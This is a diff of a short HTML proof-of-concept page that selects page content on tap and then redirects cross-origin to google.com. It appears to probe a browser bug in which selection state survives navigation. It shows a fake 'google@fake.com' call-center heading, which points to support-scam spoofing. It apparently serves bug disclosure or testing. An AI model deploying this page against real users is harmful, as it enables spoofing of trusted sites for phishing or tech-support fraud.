@@ -2,57 +2,23 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>FINAL POC</title>
-<style>
-  body { margin:0; font-family:sans-serif }
-  #content { padding:40px }
-</style>
-</head>
-<body>
-
-<div id="content">
-  <h2>TEXT INI KESELECT</h2>
-  <p>Lorem ipsum dolor sit amet</p>
-</div>
-
-<button onclick="go()" style="font-size:20px;margin:20px">
-TAP
-</button>
-
+<title>Origin A</title>
 <script>
-async function go() {
-  // 1️⃣ SELECT ALL (STABIL)
-  const el = document.getElementById("content");
-  const range = document.createRange();
-  range.selectNodeContents(el);
-  const sel = window.getSelection();
-  sel.removeAllRanges();
-  sel.addRange(range);
+function trigger() {
+  // Step 1: create selection
+  document.execCommand("selectAll");
 
-  // 2️⃣ MASUK FULLSCREEN (INI KUNCI EFEK YANG KAMU LIHAT)
-  if (document.documentElement.requestFullscreen) {
-    await document.documentElement.requestFullscreen();
-  }
-
-  // 3️⃣ TRIGGER DOWNLOAD (TXT BUATAN SENDIRI)
-  const blob = new Blob(
-    ["Ini file txt buatan JS"],
-    { type: "text/plain" }
-  );
-  const a = document.createElement("a");
-  a.href = URL.createObjectURL(blob);
-  a.download = "test.txt";
-  a.click();
-
-  // 4️⃣ KELUAR FULLSCREEN + REDIRECT
+  // Small delay to ensure selection state is committed
   setTimeout(() => {
-    if (document.fullscreenElement) {
-      document.exitFullscreen();
-    }
-    location.href = "https://chrome.com";
-  }, 700);
+    // Step 2: cross-origin navigation
+    location.href = "https://google.com/";
+  }, 50);
 }
 </script>
+</head>
+<body onmousedown="trigger()">
+<h2> call center google@fake.com </h2>
 
+<p>Tap anywhere</p>
 </body>
 </html>
